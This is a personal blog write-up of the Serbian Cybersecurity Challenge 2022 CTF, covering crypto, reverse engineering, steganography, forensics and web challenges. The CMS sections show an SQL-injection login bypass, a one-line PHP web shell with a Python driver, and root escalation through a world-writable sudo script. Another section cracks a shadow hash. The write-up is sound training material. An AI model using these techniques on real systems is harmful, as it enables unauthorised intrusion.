@@ -1,0 +1,865 @@
+---
+title:  "Serbian Cybersecurity Challenge 2022 — Writeup"
+description: "This is my writeup for the first phase of the Serbian Cybersecurity Challenge 2022. It was held online on the Avatao platform. SCC2022 was the first CTF competition I've ever participated in."
+categories: ['Writeup']
+tags: ['SCC 2022', 'CTF']
+permalink: serbian-cybersecurity-challenge-2022-writeup
+read_time: 19
+date: 2022-07-20 02:30 +0200
+image:
+  path: /assets/img/cards/serbian-cybersecurity-challenge-2022-writeup.png
+---
+The first phase of the **Serbian Cybersecurity Challenge 2022** was held online on the [Avatao][avatao]{:target="_blank"} platform. It started on the **12th of March  2022** at 10:30 (GMT+1), and lasted until the next day at 23:59. Bachelor and master students, as well as high school students studying in Serbia could participate in this competition.
+
+This phase of the competition consisted of competing between individuals, and the next phase (upcoming in September) will consist of competing between teams. The best performing individuals in the first phase were invited to the Serbian national team to participate in the [European Cyber Security Challenge 2022][ecsc]{:target="_blank"}.
+
+# My Thoughts
+
+SCC2022 was the first CTF competition I've ever participated in. I jumped into this CTF right after a half-year break from doing any security challenges, since I had a fairly challenging semester and I had to focus on my studies. With enough persistence, dedication and a bit of luck, I managed to solve all challenges in about 10 hours and 30 minutes, and I placed **2nd** 🥈.
+
+I am very satisfied with my result and I am also very pleased to announce that I was invited to the Serbian national team that will participate in [ECSC 2022][ecsc]{:target="_blank"} in September. 🎉
+
+![](/uploads/{{ page.permalink }}/ss1.webp)
+
+# Writeup
+
+The order of the challenges in my writeup is the same as on Avatao, but keep in mind that my order of doing challenges was fairly random. If I got stuck on one challenge, I would move on to another, and so on.
+
+I also tried to write about the rabbit holes I went into, because my goal is not to document only the solution, but my whole thought process.
+
+So let's get started!
+
+## Simple crypto — 50 points
+
+![](/uploads/{{ page.permalink }}/ss2.webp)
+
+We are given a ciphertext that we have supposedly recorded while eavesdropping on an encrypted communication channel. There are three big hints in this challenge:
+
+1. data is supposedly encoded and encrypted with well-known AND frequently used algorithms;
+2. the key consists of the following 8-character word: `CHALENGE`;
+3. the typo in `CHALENGE` is intentional.
+
+I assumed that it's spelled `CHALENGE` instead of `CHALLENGE` to make the key 8 bytes long, which is a convenient size for a cryptographic key. That third hint could be useful but I didn't really need it. The typo's intention seemed very obvious to me.
+
+Since the ciphertext is encrypted with a well-known algorithm, I pasted the cipher into [CyberChef][cyberchef]{:target="_blank"} and hoped to decrypt it quickly without much digging into the algorithms. The challenge is tagged with "Asymmetric Encryption", so I decided to try out every asymmetric algorithm from CyberChef and feed it our key. Many algorithms required a key that is at least 16 bytes long, so I used `CHALENGECHALENGE` (or as many repetitions of the word as necessary). Repeating keys is common in classic cryptography.
+
+![](/uploads/{{ page.permalink}}/ss3.webp)
+
+I was trying algorithms and their configurations and then I stopped halfway through because something seemed off. Some of the algorithms didn't seem to fit that "well-known AND frequently used" description, and I had no success with the most popular ones.
+
+I decided to focus more on that "well-known AND frequently used" part and decided to try out some popular symmetric algorithms too. The first on the list was [AES][aes]{:target="_blank"}. I set the key to `CHALENGECHALENGE`, the initialization vector to 32 zeros (HEX), and then I started switching modes of operation between CBC, CFB, etc. until I got to ECB.
+
+![](/uploads/{{ page.permalink}}/ss4.webp)
+
+> Note: ECB does not use an initialization vector, so these 32 zeros are ignored. You can read more about block cipher modes of operation on this [wiki page][block-cipher-modes]{:target="_blank"}.
+
+The output for this configuration is a base64 string.
+
+![](/uploads/{{ page.permalink}}/ss5.webp)
+
+CyberChef also spotted it's base64 so it suggested adding the *From Base64* operation to our recipe, and that's how we get the flag.
+
+![](/uploads/{{ page.permalink}}/ss6.webp)
+
+```
+This text contains the relevant flag val: very_easy_to_find_flag
+```
+
+## Crypto with wings — 50 points
+
+![](/uploads/{{ page.permalink }}/ss7.webp)
+
+We have another cryptographic challenge. There is this string:
+
+```
+052h 065h 064h 020h 042h 075h 06Ch 06Ch 020h 067h 069h 076h 065h 073h 020h 079h 06Fh 075h 020h 077h 069h 069h 069h 06Eh 067h 073h 020h 024h 07Bh 052h 042h 043h 052h 059h 050h 054h 04Fh 043h 048h 041h 04Ch 04Ch 045h 04Eh 047h 045 05Fh 034h 05Fh 053 043h 053h 032h 030h 032h 032h 07Dh
+```
+
+This format does not seem familiar, but it does have some common features. Groups of four characters are divided by spaces, and each group starts with `0` and ends with `h`. `h` may stand for hexadecimal, which makes perfect sense since every other character is from the hex alphabet. When looking at the character groups, there are some exceptions, such as `045` and `053` that lack the character `h` at the end.
+
+The first thing I did was to google "convert hex to ascii". Then I opened some converter on [rapidtables][rapidtables]{:target="_blank"}. I entered `52`, `65`, `64` and `20` one after another, and ASCII characters I got were, respectively, `R`, `e`, `d`, `space`. Alright that may be something!
+
+I quickly opened the Python interpreter to automate the process and I got the flag:
+
+```py
+>>> s = "052h 065h 064h 020h 042h 075h 06Ch (...)"
+>>> "".join([chr(int(g[1:3], 16)) for g in s.split()])
+'Red Bull gives you wiiings ${RBCRYPTOCHALLENGE_4_SCS2022}'
+```
+
+## Unscramble BTC address — 50 points
+
+![](/uploads/{{ page.permalink }}/ss8.webp)
+
+The next challenge requires reverse engineering. To be honest, I had no time to prepare for reverse engineering challenges, so I just relied on `ltrace` and `strings` and hoped for the best.
+
+I downloaded the executable and I ran `file`:
+```
+TheProgramToRE_noDebug: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c4bb53f095c3dd77c99e22fe83b8c47bd506618b, for GNU/Linux 3.2.0, not stripped
+```
+It's an ELF 64-bit executable. I ran the program to see how it behaves.
+
+![](/uploads/{{ page.permalink }}/ss9.webp)
+
+There is some text that makes a story, a scrambled BTC address, and it prompts us to enter the amount of BTC.
+
+I entered number 100 to see what happens.
+
+![](/uploads/{{ page.permalink }}/ss13.webp)
+
+Okay, 100 is certainly not the correct amount. Then it prompts again for the second challenge. I entered 200.
+
+![](/uploads/{{ page.permalink }}/ss14.webp)
+
+No luck, but I found out what the program does.
+
+I ran `ltrace` and hoped it's an easy challenge.
+
+Now there is some interesting stuff!
+
+We can see parts of the address and some decimal numbers.
+
+![](/uploads/{{ page.permalink }}/ss10.webp)
+
+![](/uploads/{{ page.permalink }}/ss11.webp)
+
+Could this be the correct amount? I tried it out.
+
+![](/uploads/{{ page.permalink }}/ss12.webp)
+
+It was incorrect, but the correct amount was right in front of me: 
+```
+strcmp("39.533738", "39.53373831")
+```
+
+I enter `99999` for the second challenge, and I see the second amount: 
+```
+strcmp("99999", "76.31342913")
+```
+
+The right values should be `39.53373831` and `76.31342913`. I ran the program again.
+
+![](/uploads/{{ page.permalink }}/ss15.webp)
+
+These are the correct amounts. And the program just exited. And both amounts are not the flag.
+
+Seems like this program is just for checking if we got the right BTC address and I was just wasting my time. 😎
+
+So I started examining these parts of the address.
+
+![](/uploads/{{ page.permalink }}/ss16.webp)
+
+At first glance, the bottom part looks like the first half of the address, which should make the upper part the second half. 
+
+- The bottom part starts with `1` — BTC addresses start with `1`, `3`, or `bc1`.
+- There are no `0`, `O`, `I` or `l` in both parts, and other characters make them valid base58 strings — base58 is a format used for Bitcoin addresses
+
+I concatenated the parts and I checked the resulting address, `1E5SyMx6xbLo2W2f8Eih9bnGUf3Ud7rgjW`, on [blockchain.com][blockchain]{:target="_blank"}. The address is valid and it has a transaction history. This is obviously no coincidence so I submitted this address as a flag.
+
+It's correct! 🎉
+
+Also, after browsing the transactions for this address, I found the [transaction][blockchain-transaction]{:target="_blank"} I was supposed to find. Still, finding the exact transaction and checking the balances against that executable seems pointless, since it's highly unlikley to generate another existing address by unscrambling. There are 2^160 possible bitcoin addresses, and if you happen to unscramble a valid address that has a transaction history, it's **HIGHLY** UNLIKELY to be a coincidence!
+
+## BTC amount transferred — 150 points
+
+![](/uploads/{{ page.permalink }}/ss17.webp)
+
+Here comes another reverse engineering challenge, this time for 150 points.
+
+I downloaded the file for this challenge and I found out it's the same executable from the previous challenge.
+
+I ran `md5sum TheProgramToRE_noDebug` to both executables and I saw their checksums are the same:
+```
+3893a96a055ae15c53dd30348e9c1e02  TheProgramToRE_noDebug
+3893a96a055ae15c53dd30348e9c1e02  TheProgramToRE_noDebug
+```
+
+The challenge is to find the amount of BTC transferred on 20 February 2022 at 08:21 PM, but I had already done that and I knew it's `39.53373831`.
+
+The flag should be in the '0.00000000 BTC' format, so I submitted `39.53373831 BTC` as a flag and... that's it. 
+
+Wow, easiest 150 points!
+
+## BTC amount transferred — 300 points
+
+"Find the BTC balance of the Syndicate BTC address at the time of cyber-attack payment (8:21pm on February 20th, 2022)."
+
+So, I assumed it's the same as the previous one except now it's `76.31342913 BTC`. 
+
+And I was right.
+
+More easy points and I climbed up the leaderboard! ⬆️
+
+## Simple CMS - Part 1 — 50 points
+
+![](/uploads/{{ page.permalink }}/ss18.webp)
+
+Here is the first web challenge. Our goal is to access the CMS as an admin user.
+
+The first thing I saw is this web page.
+
+![](/uploads/{{ page.permalink }}/ss19.webp)
+
+I browsed the website, looked at the page source but there was nothing interesting. At that point I knew that the application is written in php because of the ".php" extension.
+
+Clicking on the blue login button leads to the login page. 
+
+![](/uploads/{{ page.permalink }}/ss20.webp)
+
+I tried some default credentials such as `admin:admin` but no luck. I tried to find some usernames on the site but I couldn't find any.
+
+I decided to start with an SQL injection. I opened up [BurpSuite][burp]{:target="_blank"}, turned *intercept* on and submitted the login form with the credentials `admin:pass`. 
+
+![](/uploads/{{ page.permalink }}/ss21.webp)
+
+I sent the request to the Intruder, and I marked the value of the `username` field as the payload position. 
+
+![](/uploads/{{ page.permalink }}/ss22.webp)
+
+I grabbed this [list of payloads][sqli-payloads]{:target="_blank"} from PayloadsAllTheThings and used it in the "Sniper" attack.
+
+![](/uploads/{{ page.permalink }}/ss23.webp)
+
+In case of a failed login attempt, there is a message on the page that says "Incorrect username or password. Please try again.". I configured the Intruder to flag the responses that contain that message.
+
+![](/uploads/{{ page.permalink }}/ss24.webp)
+
+Everything was ready, so I started the attack.
+
+6 requests later and I hit something!
+
+![](/uploads/{{ page.permalink }}/ss25.webp)
+
+This response had the status code 302, a different length and no failed login attempt message.
+
+I went to the login page to login using the same payload (`' or 1=1 limit 1 -- -+`).
+
+![](/uploads/{{ page.permalink }}/ss26.webp)
+
+And it worked, the flag was right there on the page.
+
+## Simple CMS - Part 2 — 50 points
+
+![](/uploads/{{ page.permalink }}/ss27.webp)
+
+Hacking the simple CMS continues in this challenge. The goal is to get `user.txt`.
+
+I explored what I can do as an admin, and it seems that the only functionality is adding new posts.
+
+![](/uploads/{{ page.permalink }}/ss28.webp)
+
+As soon as I saw uploading files, I figured that this challenge has something to do with file uploads. There is nothing much left in the app — this CMS is indeed fairly simple.
+
+I was already thinking about uploading a PHP file with manipulated magic bytes to bypass the file upload restrictions, but after playing around and uploading different files I realized that there are no restrictions at all. I could upload a PHP file and it would be stored in the `/img/` folder, no questions asked.
+
+And that's what I did.
+
+I uploaded a simple web shell. It executes a command from the `cmd` query parameter and displays its output on the page.
+```php
+<?php passthru($_GET['cmd']); ?>
+```
+
+It was available at `/img/shell.php`
+
+![](/uploads/{{ page.permalink }}/ss29.webp)
+
+I also wrote this quick Python script to make executing commands easier.
+
+```py
+import requests
+import urllib.parse
+
+while True:
+    command = urllib.parse.quote_plus(input("> "))
+    response = requests.get("https://16daa14e273543ccedf42c348aaea527bf7b0dc0.next.avatao-challenge.com/img/shell.php?cmd=" + command)
+    print(response.text)
+```
+
+Since this is a web shell, some commands don't work as expected because there is no persistence. For example, we can't change our working directory using `cd`, so we have to type relative or absolute paths of other files and directories.
+
+Browsing parent folders quickly led me to `user.txt` and I got the flag.
+
+```
+> ls -la ../../
+total 28
+drwxr-xr-x 1 root     root     4096 May 11 10:46 .
+drwxr-xr-x 1 root     root     4096 May 11 10:45 ..
+drwxr-xr-x 1 root     root     4096 Jul 17 03:00 html
+-rw------- 1 www-data www-data   28 May 11 10:46 user.txt
+
+> cat ../../user.txt
+FLAG{DZIVI:9836478987-USER}
+```
+
+That was fun!
+
+## Simple CMS - Part 3 — 150 points
+
+![](/uploads/{{ page.permalink }}/ss30.webp)
+
+I started the instance, logged in as an admin, uploaded the shell and I was headed to get `root.txt`.
+
+The first thing I tried was to upgrade my web shell with a more convenient reverse shell. I attempted to spawn a reverse shell by using multiple payloads from this [Reverse Shell Cheatsheet][reverseshells]{:target="_blank"}, but without success. Commands such as `ping`, `host`, `wget` or `curl` also didn't work at all, so it seemed like it's impossible to get internet access from this machine.
+
+I gave up and decided to continue using the same web shell.
+
+I ran `sudo -l` to see which commands I could run as root.
+
+```
+> sudo -l
+Matching Defaults entries for www-data on avatao:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on avatao:
+    (ALL : ALL) SETENV: NOPASSWD: /opt/scripts/mycleaner
+```
+
+I could execute `/opt/scripts/mycleaner` as root.
+
+```
+> cat /opt/scripts/mycleaner 
+#!/usr/bin/env python3
+
+import os
+try:
+    os.remove("/tmp/dziapp-cache/*")   
+except:
+    pass
+
+print ("cache cleaned ...")
+```
+
+It's a Python script that removes files in a folder. Nothing interesting in the script itself, so I ran `ls -l` to view the permissions on this file.
+
+```
+> ls -l /opt/scripts/mycleaner
+-rwxrwxrwx 1 www-data www-data 127 May 11 10:56 /opt/scripts/mycleaner
+```
+
+Great! There is a write permission so it can be edited. Since I couldn't use nano or vim in this web shell, I used `echo` for editing. I changed it to a bash script which runs `whoami`.
+
+```
+> echo "#!/bin/bash\nwhoami" > /opt/scripts/mycleaner
+
+> sudo /opt/scripts/mycleaner
+root
+```
+
+It worked! Then I changed it to run any command using `eval` and command line arguments.
+
+```
+> echo "#!/bin/bash\neval \$1" > /opt/scripts/mycleaner
+
+> cat /opt/scripts/mycleaner
+#!/bin/bash
+eval $1
+
+> sudo /opt/scripts/mycleaner whoami
+root
+```
+
+This was a bit of an overkill for getting `root.txt` but it was a fun thing to do. I changed my Python script a bit so every command I run is being run as root.
+
+```py
+command = urllib.parse.quote_plus('sudo /opt/scripts/mycleaner "' + input("> ") + '"')
+```
+
+```
+> whoami
+root
+
+> ls -la ~
+total 20
+drwx------ 1 root root 4096 May 11 10:56 .
+drwxr-xr-x 1 root root 4096 Jul 18 17:40 ..
+-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
+-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
+-rw------- 1 root root   28 May 11 10:56 root.txt
+
+> cat ~/root.txt
+FLAG{DZIVI:7283456896-ROOT}
+```
+
+And here is the flag! Hacking the CMS was fun, let's move on.
+
+## Air Intake to the gold - Gold means 1 — 150 points
+
+![](/uploads/{{ page.permalink }}/ss31.webp)
+
+This challenge was among the hardest challenges for me. This writeup will mostly consist of the dead ends I encountered, because that's how solving this challenge went for me.
+
+So, this is a steganography challenge and there is a file we can download.
+
+![](/uploads/{{ page.permalink }}/ss32.webp)
+
+I copied the link and downloaded it using `wget` to keep the exif data unchanged (downloading directly from a browser may change data such as modification date/time).
+
+![](/uploads/{{ page.permalink }}/ss34.webp)
+
+It's a photo of Max Verstappen driving a F1 car in the snow. The challenge description contains a backstory of this picture and a (really cool) [video](https://www.youtube.com/watch?v=gkwoK0EfKdc){:target="_blank"}. I was looking for some clues but I couldn't find any.
+
+On the picture itself, there is a yellow-blue rectangle.
+
+![](/uploads/{{ page.permalink }}/ss35.webp)
+
+At first glance it looked like it could be a word, maybe flipped or rotated, but flipping and rotating the image didn't help at all. I decided to try other things and get back to these pixels later.
+
+I ran `exiftool` and there was nothing interesting.
+
+I reverse searched the image on Google and found the original photo on [RedBull's site][redbull]{:target="_blank"}. The original can be useful for comparing it to the altered photo to detect the changes. The only change visible to the naked eye was the rectangle in the middle.
+
+Before diving into comparing images (I've never done this stuff before), I decided to try out some common tools such as [steghide][steghide]{:target="_blank"} and some steganography CTF tools I could find, such as [stegsolve][stegsolve]{:target="_blank"}, [jstego][jstego]{:target="_blank"} or [stegoveritas][stegoveritas]{:target="_blank"}.
+
+It took me hours to try out these tools and every one of them just led me to a dead end, so I took a break from this challenge.
+
+When I came back to this challenge, I decided to examine these yellow and blue pixels. Using the eyedropper tool in Firefox I spotted that not all yellow or blue pixels have the exact same color. For example, the top left blue pixel has the color code `#004386`, and another blue pixel next to it has the color code `#004287`. I thought that there may be a message written in those hex values, but I couldn't find anything meaningful or promising. I took a break again.
+
+I came back to this challenge again and I looked at the same yellow and blue pixels. This time I started by counting pixels and I saw that the rectangle is **16** pixels wide. "Wait, that could be it?", I thought.
+
+There is *2\*8* of *something* that has *two* possible values. Are those pixels just bits that form bytes that represent something meaningful?
+
+I started writting down zeros and ones for each pixel (`1` for each blue and `0` for each yellow pixel) and I came up with this:
+```
+1101101110000100
+1010110110111101
+1010000010101100
+1011110010101100
+1010000010101100
+1010101110111010
+1011100010000010
+```
+
+The next thing I wanted to do was to convert these numbers to Unicode, so I opened up the Python interpreter and I loaded the file.
+```py
+>>> f = open("pixels")
+>>> s = f.read()
+```
+
+I created a list of strings, each representing one byte.
+
+```py
+>>> s.split("\n")
+['1101101110000100', '1010110110111101', '1010000010101100', '1011110010101100', '1010000010101100', '1010101110111010', '1011100010000010']
+>>> chars = []
+>>> for row in s.split("\n"):
+...     chars.append(row[:8])
+...     chars.append(row[8:])
+... 
+>>> chars
+['11011011', '10000100', '10101101', '10111101', '10100000', '10101100', '10111100', '10101100', '10100000', '10101100', '10101011', '10111010', '10111000', '10000010']
+```
+
+I tried to convert them to Unicode using `chr()`, and I got some nonsense.
+```py
+>>> "".join(chr(int(c, 2)) for c in chars)
+'Û\x84\xad½\xa0¬¼¬\xa0¬«º¸\x82'
+```
+
+However, it's not that surprising since every byte starts with `1`, which is obviously too high for common Unicode characters. I flipped all the bits and tried again.
+
+```
+0010010001111011
+0101001001000010
+0101111101010011
+0100001101010011
+0101111101010011
+0101010001000101
+0100011101111101
+```
+
+```
+>>> "".join(chr(int(c, 2)) for c in chars)
+'${RB_SCS_STEG}'
+```
+
+Finally!!! This challenge wasn't actually that hard after all, but I managed to overthink it. 
+
+Still, the hardest 150 points so far! Now I see a *huge* hint that says "Gold means 1" right in the title. I had no idea that "gold" could mean "yellow" the first time I saw it. 🤦‍♂️
+
+## The secret of the Sopotnica waterfall — 50 points
+
+![](/uploads/{{ page.permalink }}/ss36.webp)
+
+This is another steganography challenge. I copied the link and downloaded the file using `wget`.
+
+![](/uploads/{{ page.permalink }}/ss37.webp)
+
+It's a photo of the Sopotnica waterfalls.
+
+![](/uploads/{{ page.permalink }}/sopotnica.webp)
+
+There are no visible changes to the picture so I started by running `exiftool`.
+
+```
+ExifTool Version Number         : 11.16
+File Name                       : sopotnica.png
+Directory                       : .
+File Size                       : 896 kB
+File Modification Date/Time     : 2022:03:07 15:03:10+01:00
+File Access Date/Time           : 2022:07:19 14:07:11+02:00
+File Inode Change Date/Time     : 2022:07:19 14:06:49+02:00
+File Permissions                : rw-r--r--
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 800
+Image Height                    : 450
+Bit Depth                       : 8
+Color Type                      : RGB
+Compression                     : Deflate/Inflate
+Filter                          : Adaptive
+Interlace                       : Noninterlaced
+Exif Byte Order                 : Big-endian (Motorola, MM)
+Make                            : samsung
+Camera Model Name               : 5A6D78685A33745451304E664D6A41794D6C3878587A51344F5468664C7A51794E4452664C7A49324D6A45304D7A63794E544D34587938784D4463784E4463784F4638764E4451354D58303D
+Orientation                     : Horizontal (normal)
+X Resolution                    : 72
+Y Resolution                    : 72
+(...)
+```
+
+There is something interesting in the exif data: the value of `Camera Model Name` looks odd. It's long and looks like a hex string. I pasted it into [CyberChef][cyberchef]{:target="_blank"}.
+
+CyberChef immediately recognized it as a hex string and suggested adding the *From Hex* operation. Then it recognized a base64 string and suggested adding the *From Base64*.
+
+CyberChef did all the work for me. This recipe yields the flag.
+
+![](/uploads/{{ page.permalink }}/ss38.webp)
+
+## Failed exfiltration — 50 points
+
+![](/uploads/{{ page.permalink }}/ss39.webp)
+
+Another steganography challenge, but now it's a docx file instead of a picture. This challenge caused me some trouble and I ran into some dead ends, but I described my approaches even though they were unsuccessful. After all, I learned some cool new tricks.
+
+I downloaded this file called `Failed exfiltration_clean.docx` using `wget`.
+
+I ran `file` and it said `Microsoft Word 2007+`.
+
+I opened it in LibreOffice but there wasn't anything there.
+
+![](/uploads/{{ page.permalink }}/ss40.webp)
+
+Just some newlines on a single page.
+
+![](/uploads/{{ page.permalink }}/ss41.webp)
+
+I ran `strings` but nothing in the output looked like a flag.
+
+A quick Google search taught me that docx files are actually zip archives, so I ran `unzip`.
+
+```
+unzip "Failed exfiltration_clean.docx"
+```
+
+```
+Archive:  Failed exfiltration_clean.docx
+  inflating: [Content_Types].xml     
+  inflating: _rels/.rels             
+  inflating: word/document.xml       
+  inflating: word/_rels/document.xml.rels  
+  inflating: word/theme/theme1.xml   
+  inflating: word/settings.xml       
+  inflating: customXml/item1.xml     
+  inflating: customXml/itemProps1.xml  
+  inflating: word/numbering.xml      
+  inflating: word/styles.xml         
+  inflating: word/webSettings.xml    
+  inflating: word/fontTable.xml      
+  inflating: docProps/core.xml       
+  inflating: docProps/app.xml        
+  inflating: customXml/_rels/item1.xml.rels
+```
+
+Here is the output of the `tree` command to see the file structure.
+
+```
+.
+├── [Content_Types].xml
+├── customXml
+│   ├── item1.xml
+│   ├── itemProps1.xml
+│   └── _rels
+│       └── item1.xml.rels
+├── docProps
+│   ├── app.xml
+│   └── core.xml
+├── Failed exfiltration_clean.docx <-- original file
+├── _rels
+└── word
+    ├── document.xml
+    ├── fontTable.xml
+    ├── numbering.xml
+    ├── _rels
+    │   └── document.xml.rels
+    ├── settings.xml
+    ├── styles.xml
+    ├── theme
+    │   └── theme1.xml
+    └── webSettings.xml
+
+7 directories, 15 files
+```
+
+I tried to grep for a flag or other interesting strings but I had no success. Here are some commands I tried:
+
+```sh
+grep -r flag # search recursively for "flag"
+grep -ri flag # ignore case
+grep -roE "http://.{,30}" # search for links
+grep -roE "\{.+\}" # search for strings between curly braces
+```
+
+I explored the files by hand but I couldn't find anything promising. I believed that it has something to do with extracting a docx file because it seemed easy enough for an easy challenge. Since I was kinda stuck, I decided to take a break and come back later.
+
+When I came back to this challenge, I examined every file by hand but I couldn't find anything at all. I opened the file again but nothing interesting, just some boring newlines.  Or maybe there are some characters that are not rendered correctly by LibreOffice? 
+
+I copied all the contents of the file and pasted it into Sublime Text editor. By selecting all of the text, I discovered some characters I haven't seen before.
+
+![](/uploads/{{ page.permalink }}/ss42.webp)
+
+When selecting text in Sublime, it shows spaces as dots and tabs as lines, like in the following example.
+
+![](/uploads/{{ page.permalink }}/ss43.webp)
+
+I replaced all spaces with "a"s and all tabs with "b"s.
+
+![](/uploads/{{ page.permalink }}/ss44.webp)
+
+Between the groups of "a"s and "b"s there is a different space character. Its ASCII value is 160:
+
+```py
+>>> ord(" ")
+160
+```
+
+So, we have groups of characters separated by spaces, and each character can have one of two possible values. That reminded me of [Morse code](https://en.wikipedia.org/wiki/Morse_code){:target="_blank"} which uses dots and dashes to code letters and numbers.
+
+I replaced "a"s with dots and "b"s with dashes:
+
+```
+.---- -. ...- .---- ... .---- -... .-.. .---- ..-. .-.. ....- --.
+```
+
+Then I converted it to text using the *From Morse Code* operation on CyberChef.
+
+```
+1NV1S1BL1FL4G
+```
+
+And there is the flag!
+
+This challenge wasn't that hard but I did make it unnecessary harder because I overlooked the content of the file and jumped straight into unzipping. Extracting the docx file felt like the right direction at the time, but the solution was right in front of me from the start!
+
+## d4th in reverse — 50 points
+
+![](/uploads/{{ page.permalink }}/ss45.webp)
+
+Here is another reverse engineering challenge. There is a file called `d4th_reverse`.
+
+I downloaded it and ran `file`, but it was not very helpful:
+```
+d4th_reverse: data
+```
+
+I opened the file using `less` and all I could see were mostly unprintable characters.
+
+![](/uploads/{{ page.permalink }}/ss46.webp)
+
+Besides these unprintable characters, there are some interesting strings which can be picked up by the `strings` tool.
+
+```sh
+strings d4th_reverse
+```
+
+```
+datetimeZ
+charray
+print
+./d4th_reverse.py
+<module>
+```
+
+I was thinking that `./d4th_reverse.py` may indicate that there was a Python file called `d4th_reverse.py`. I figured that maybe this file I downloaded is a compiled bytecode of `d4th_reverse.py`.
+
+I used [uncompyle6][uncompyle6]{:target="_blank"} to try to decompile this file.
+
+First I added the `.pyc` extension.
+
+```sh
+mv d4th_reverse d4th_reverse.pyc
+```
+
+And then I ran uncompyle6.
+
+```sh
+uncompyle6 d4th_reverse.pyc > d4th_reverse.py
+```
+
+Here is the resulting Python script.
+
+```py
+# uncompyle6 version 3.8.0
+# Python bytecode 3.8.0 (3413)
+# Decompiled from: Python 3.9.1 (default, Feb  7 2022, 02:43:19) 
+# [GCC 8.3.0]
+# Embedded file name: ./d4th_reverse.py
+# Compiled at: 2022-03-08 22:22:24
+# Size of source mod 2**32: 224 bytes
+import datetime
+charray = [
+ 'r', 'v', '3', '4', 'f', '1', 's', 'g']
+print(charray[0] + charray[2] + charray[1] + charray[2] + charray[0] + charray[6] + charray[2] + charray[4] + charray[5] + charray[3] + charray[7])
+# okay decompiling d4th_reverse.pyc
+```
+
+This script takes characters from an array and prints them in some order.
+
+I ran the script and got the flag.
+
+```
+r3v3rs3f14g
+```
+
+## German shadow — 50 points
+
+![](/uploads/{{ page.permalink }}/ss47.webp)
+
+This challenge is tagged with "Forensics" and "Password Cracking". In this challenge there are two downloadable files.
+
+![](/uploads/{{ page.permalink }}/ss48.webp)
+
+The first file is `german.txt.bz2` which is a compressed .txt file.
+
+I decompressed it with `bzip2 --decompress german.txt.bz2` and opened it. It's a wordlist of common German passwords.
+
+```
+AABEL
+ABC
+ABlacken
+ABlar
+ABling
+ABlschwang
+ABmannshardt
+ABmannshausen
+ABweiler
+(...)
+```
+
+The other file is a shadow file (`/etc/shadow`). A shadow file contains hashed passwords of users on UNIX-like systems. In our case, the file contains a password hash for the user "administrator".
+
+```
+(...)
+libvirt-qemu:!:18180:0:99999:7:::
+libvirt-dnsmasq:!:18180:0:99999:7:::
+Debian-snmp:!:18180:0:99999:7:::
+ftp:*:19060:0:99999:7:::
+administrator:$6$4xsKXsCq1s5KGVG7$RHjy8UHwuyLfMnlV79KXwl2lKoC5QvqoWviAsEw0UisPP80wWc90gn5T746xTGPiat0rySUqAcQLwJEPIQ6qe.:19060:0:99999:7:::
+```
+
+[John the Ripper][jtr]{:target="_blank"}, a common tool for password cracking, has the support for cracking shadow files. 
+
+I extracted the line with the password and outputted it to a file:
+
+```sh
+grep administrator shadow > hash
+```
+
+Then I ran John the Ripper with the given `german.txt` wordlist:
+
+```
+john --wordlist=./german.txt --fork=8 hash
+```
+```
+Loaded 1 password hash (crypt, generic crypt(3) [?/64])
+Node numbers 1-8 of 8 (fork)
+Press 'q' or Ctrl-C to abort, almost any other key for status
+```
+
+After a while, it found a match:
+```
+maBgeschneiderter (administrator)
+```
+
+I submitted the matched password (`maBgeschneiderter`) as a flag and it was correct.
+
+## Secrets on the wire - Part 1 — 50 points
+
+![](/uploads/{{ page.permalink }}/ss49.webp)
+
+This and the next challenge are tagged with "Log Analysis" and "Network Security".
+
+It has one downloadable file called `SCC2022-capture.zip`.
+
+I downloaded and unzipped it, and got `SCC2022-capture.pcapng` which can be opened in Wireshark.
+
+The challenge says that the goal is to "investigate the contents of the destination FTP server and extract the FTP password from the captured network traffic". So I opened the file in Wireshark.
+
+![](/uploads/{{ page.permalink }}/ss50.webp)
+
+The first thing that caught my eye after opening the file was `Request: USER korisnik` in the info column ("korisnik" means "user" in Serbian). A few packets below, there is another packet with `Request: PASS DQFYROXOKVN2`.
+
+I submitted the password `DQFYROXOKVN2` as a flag and it was correct. That was easy!
+
+## Secrets on the wire - Part 2 — 50 points
+
+![](/uploads/{{ page.permalink }}/ss51.webp)
+
+And we get to the last challenge! 
+
+This challenge uses the same file as the previous one, so I continued working in Wireshark. The next goal is to "extract meaningful information from the secret file" that was transferred.
+
+To find the packets that contain the transferred data I entered `ftp-data` in the filter.
+
+![](/uploads/{{ page.permalink }}/ss52.webp)
+
+The file that was transferred is called `SCCtwentytwo.zip`. To save that file I did the following:
+
+1. Right click on the first packet > Follow > TCP Stream
+2. Set "Show and save data as" to "Raw"
+3. Save as SCCtwentytwo.zip
+
+![](/uploads/{{ page.permalink }}/ss53.webp)
+
+Opening the saved zip archive shows that there is an image, but a password is required to open it.
+
+![](/uploads/{{ page.permalink }}/ss54.webp)
+
+Luckily, there are some instructions in the challenge description on how to get the password:
+
+> You know that the password of the secret file is obtained by encrypting the secret file's name (without dot and file extension) using the Vigenere cypher and using this same file name as the password.
+
+I used CyberChef again (*Vigenère Encode* operation) to encrypt `SCCtwentytwo` using the key `SCCtwentytwo`. The output was `KEEmsiamwmsc` and I used it to open the image.
+
+It was the correct password, and the flag is written on the image.
+
+![](/uploads/{{ page.permalink }}/ss55.webp)
+
+# Final Thoughts
+
+SCC 2022 was the first cybersecurity competition I participated in. To be honest, it was easier than I thought it would be. I had no time for serious preparing because I had to focus on my studies, but I managed to tackle all the challenges and exceed my own expectations.
+
+All I can say is that I am very satisfied with my result, and now I am proud to be a member of the Serbian national team. I am excited for the ECSC 2022 and I am ready to practice and learn more.
+
+That's all for this (long) writeup! Thank you for reading and have a great day.
+
+
+[avatao]: https://avatao.com/
+[aes]: https://en.wikipedia.org/wiki/Advanced_Encryption_Standard
+[block-cipher-modes]: https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Initialization_vector_(IV)
+[ecsc]: https://www.ecsc2022.eu/
+[blockchain]: https://www.blockchain.com/btc/address/1E5SyMx6xbLo2W2f8Eih9bnGUf3Ud7rgjW
